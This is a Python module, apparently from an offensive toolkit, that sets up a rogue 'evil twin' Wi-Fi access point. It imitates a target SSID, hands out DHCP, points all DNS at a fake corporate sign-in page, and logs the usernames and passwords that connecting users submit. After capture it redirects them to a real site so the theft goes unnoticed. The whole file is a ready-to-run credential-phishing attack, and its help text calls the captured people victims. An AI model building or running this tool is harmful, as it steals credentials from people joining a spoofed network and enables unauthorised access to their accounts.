# language: Python, file: Program/wireless/evil_twin.py, target: Red Sky wireless — evil twin AP
# Spins up a rogue AP that mimics a target SSID, hands out DHCP, redirects all
# DNS to a captive portal, and logs any credentials submitted there. Wraps
# hostapd + dnsmasq. Requires a second wifi iface (or the same one in AP mode)
# and root.

import os
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


WL_DIR = OUTPUT_DIR / "wireless"
CAPTIVE_DIR = WL_DIR / "captive"
HITS_FILE = WL_DIR / "evil_twin_hits.log"


def _which(cmd: str) -> Optional[str]:
    return shutil.which(cmd)


HOSTAPD_CONF = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

HOSTAPD_OPEN = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF = """interface={iface}
bind-interfaces
dhcp-range=10.0.66.10,10.0.66.200,12h
dhcp-option=3,10.0.66.1
dhcp-option=6,10.0.66.1
address=/#/10.0.66.1
log-queries
log-dhcp
"""

CAPTIVE_INDEX = """<!doctype html>
<html><head><meta charset="utf-8"><title>Sign in to the network</title>
<style>
  body {{ font-family: -apple-system, system-ui, sans-serif; background: #f4f4f7;
         display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
  .card {{ background: #fff; padding: 32px; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,.08); width: 340px; }}
  h1 {{ font-size: 18px; margin: 0 0 8px; }}
  p  {{ color: #666; font-size: 13px; margin: 0 0 20px; }}
  input {{ width: 100%; box-sizing: border-box; padding: 10px 12px; margin: 6px 0;
           border: 1px solid #ccc; border-radius: 6px; font-size: 14px; }}
  button {{ width: 100%; padding: 11px; background: #8b0000; color: #fff; border: 0;
            border-radius: 6px; font-size: 14px; margin-top: 12px; cursor: pointer; }}
</style></head>
<body>
<form class="card" method="POST" action="/login">
  <h1>{portal_title}</h1>
  <p>{portal_subtitle}</p>
  <input name="username" placeholder="Email or username" autofocus>
  <input name="password" type="password" placeholder="Password">
  <button type="submit">Continue</button>
</form>
</body></html>
"""


def _write_conf(text: str, name: str) -> Path:
    p = Path(tempfile.gettempdir()) / name
    p.write_text(text)
    return p


def setup_iface(iface: str, gateway: str, subnet: str) -> None:
    """Assign the gateway IP to the AP iface."""
    print_info("configuring " + iface + " with " + gateway + "/24")
    subprocess.run(["ip", "link", "set", iface, "down"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", iface], check=False)
    subprocess.run(["ip", "addr", "add", gateway + "/24", "dev", iface], check=False)
    subprocess.run(["ip", "link", "set", iface, "up"], check=False)


def enable_forwarding() -> None:
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")
    except OSError:
        print_warn("could not enable ip_forward")


def start_nat(out_iface: str, subnet: str) -> None:
    """NAT the AP subnet out the real uplink."""
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    subprocess.run(["iptables", "-F"], check=False)
    subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                    "-o", out_iface, "-j", "MASQUERADE"], check=False)
    subprocess.run(["iptables", "-A", "FORWARD", "-i", out_iface,
                    "-o", out_iface, "-j", "ACCEPT"], check=False)
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                    "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)


def start_captive_server(port: int, portal_title: str, portal_subtitle: str) -> subprocess.Popen:
    """Tiny Python HTTP server that serves the portal and logs POSTs."""
    CAPTIVE_DIR.mkdir(parents=True, exist_ok=True)
    (CAPTIVE_DIR / "index.html").write_text(
        CAPTIVE_INDEX.format(portal_title=portal_title, portal_subtitle=portal_subtitle)
    )

    server_src = f'''
import http.server, socketserver, datetime, urllib.parse, json, pathlib
PORT = {port}
HITS = pathlib.Path("{HITS_FILE}")
CAPTIVE = pathlib.Path("{CAPTIVE_DIR}")
INDEX = (CAPTIVE / "index.html").read_bytes()

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _log(self, ip, ua, path, body, creds):
        line = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " | " + ip + " | " + path
        if creds:
            for k, v in creds.items():
                line += " | " + k + "=" + v
        with HITS.open("a") as f:
            f.write(line + "\\n")
        print("[hit]", line)
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(INDEX)))
        self.end_headers()
        self.wfile.write(INDEX)
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        creds = dict(urllib.parse.parse_qsl(body))
        self._log(self.client_address[0], self.headers.get("User-Agent",""), self.path, body, creds)
        # after capture, redirect to a real site so it looks legit
        self.send_response(302)
        self.send_header("Location", "https://www.google.com")
        self.send_header("Content-Length", "0")
        self.end_headers()

with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
    print(f"[*] captive portal on :{{PORT}}")
    s.serve_forever()
'''
    p = _write_conf(server_src, "rs_captive.py")
    return subprocess.Popen([sys.executable, str(p)])


def cmd_run(iface: str, ssid: str, passphrase: str, channel: int,
            out_iface: str, gateway: str, portal_title: str, portal_subtitle: str) -> int:
    if not iface or not ssid:
        print_err("need --iface and --ssid")
        return 2

    hostapd = _which("hostapd")
    dnsmasq = _which("dnsmasq")
    if not hostapd:
        print_err("hostapd not on PATH — apt install hostapd")
        return 2
    if not dnsmasq:
        print_err("dnsmasq not on PATH — apt install dnsmasq")
        return 2

    out_iface = out_iface or "eth0"
    gateway = gateway or "10.0.66.1"

    print_info("evil twin: " + ssid)
    print_kv("iface", iface)
    print_kv("channel", channel)
    print_kv("security", "WPA2" if passphrase else "OPEN")
    print_kv("uplink", out_iface)
    print_kv("gateway", gateway)
    print()

    # 1) configure iface
    setup_iface(iface, gateway, "10.0.66.0/24")
    enable_forwarding()
    start_nat(out_iface, "10.0.66.0/24")

    # 2) hostapd
    if passphrase:
        hostapd_conf = HOSTAPD_CONF.format(iface=iface, ssid=ssid, channel=channel, passphrase=passphrase)
    else:
        hostapd_conf = HOSTAPD_OPEN.format(iface=iface, ssid=ssid, channel=channel)
    hp = _write_conf(hostapd_conf, "rs_hostapd.conf")

    hostapd_proc = subprocess.Popen([hostapd, str(hp)])
    time.sleep(2)
    print_ok("hostapd up — SSID: " + ssid)

    # 3) dnsmasq
    dns_conf = DNSMASQ_CONF.format(iface=iface)
    dp = _write_conf(dns_conf, "rs_dnsmasq.conf")
    dnsmasq_proc = subprocess.Popen([dnsmasq, "-C", str(dp), "-d"])

    # 4) captive portal
    portal_proc = start_captive_server(80, portal_title or "Sign in to the network",
                                       portal_subtitle or "Use your corporate credentials to continue.")

    print()
    print_ok("evil twin running")
    print_info("victims connecting to '" + ssid + "' will see the captive portal")
    print_info("hits -> " + str(HITS_FILE))
    print()
    print_warn("CTRL+C to tear down")

    def _stop(*_):
        print()
        print_info("tearing down")
        for proc in (portal_proc, dnsmasq_proc, hostapd_proc):
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                pass
        subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
        subprocess.run(["iptables", "-F"], check=False)
        sys.exit(0)

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    try:
        hostapd_proc.wait()
    except KeyboardInterrupt:
        _stop()

    return 0


def cmd_hits() -> int:
    if not HITS_FILE.exists():
        print_info("no hits yet")
        return 0
    for line in HITS_FILE.read_text().splitlines():
        print(BONE + line + RESET)
    return 0


def cmd_portal(portal_title: str, portal_subtitle: str, port: int) -> int:
    """Standalone: just run the captive portal, no AP. Useful if you've already got the AP up."""
    print_info("captive portal on :" + str(port))
    proc = start_captive_server(port, portal_title or "Sign in", portal_subtitle or "")
    try:
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky wireless evil_twin", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="run", choices=["run", "hits", "portal"])
    p.add_argument("--iface", default="")
    p.add_argument("--ssid", default="")
    p.add_argument("--passphrase", default="")
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--uplink", default="eth0")
    p.add_argument("--gateway", default="10.0.66.1")
    p.add_argument("--portal-title", default="Sign in to the network")
    p.add_argument("--portal-subtitle", default="Use your corporate credentials to continue.")
    p.add_argument("--port", type=int, default=80)

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky wireless evil_twin run --iface wlan1 --ssid 'FreeWiFi' [--passphrase pw] [--uplink eth0]")
        print_err("       redsky wireless evil_twin hits")
        print_err("       redsky wireless evil_twin portal --portal-title 'Corp WiFi'")
        return 2

    if ns.help:
        print_info("run     -- spin up hostapd + dnsmasq + captive portal (needs root)")
        print_info("hits    -- print captured credentials")
        print_info("portal  -- only run the portal (use when AP is already up)")
        print_info("")
        print_info("The AP iface should be a dedicated wireless adapter in AP mode-capable hardware.")
        print_info("--uplink is your real internet iface (eth0, wlan0, etc.) for NAT.")
        return 0

    if ns.action == "hits":
        return cmd_hits()
    if ns.action == "portal":
        return cmd_portal(ns.portal_title, ns.portal_subtitle, ns.port)
    return cmd_run(ns.iface, ns.ssid, ns.passphrase, ns.channel, ns.uplink,
                   ns.gateway, ns.portal_title, ns.portal_subtitle)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
